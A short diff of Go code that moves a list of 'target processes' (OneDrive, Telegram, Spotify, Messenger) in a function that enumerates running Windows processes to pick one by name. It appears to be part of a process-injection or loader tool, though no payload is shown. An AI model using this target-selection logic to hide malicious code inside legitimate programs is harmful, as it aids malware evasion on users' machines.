@@ -31,12 +31,11 @@ func getprocname(id uint32) string {
 }
 
 func getpid() uint32 {
+    // enter target processes here, the more the better..
+    target_procs := []string{"OneDrive.exe", "Telegram.exe", "Spotify.exe", "Messenger.exe"}
     sz := uint32(1000)
     procs := make([]uint32, sz)
     var bytesReturned uint32
-    
-    // enter target processes here, the more the better..
-    target_procs := []string{"OneDrive.exe", "Telegram.exe", "Spotify.exe", "Messenger.exe"}
     for _,proc := range target_procs {
         if w32.EnumProcesses(procs, sz, &bytesReturned) {
             for _, pid := range procs[:int(bytesReturned)/4] {
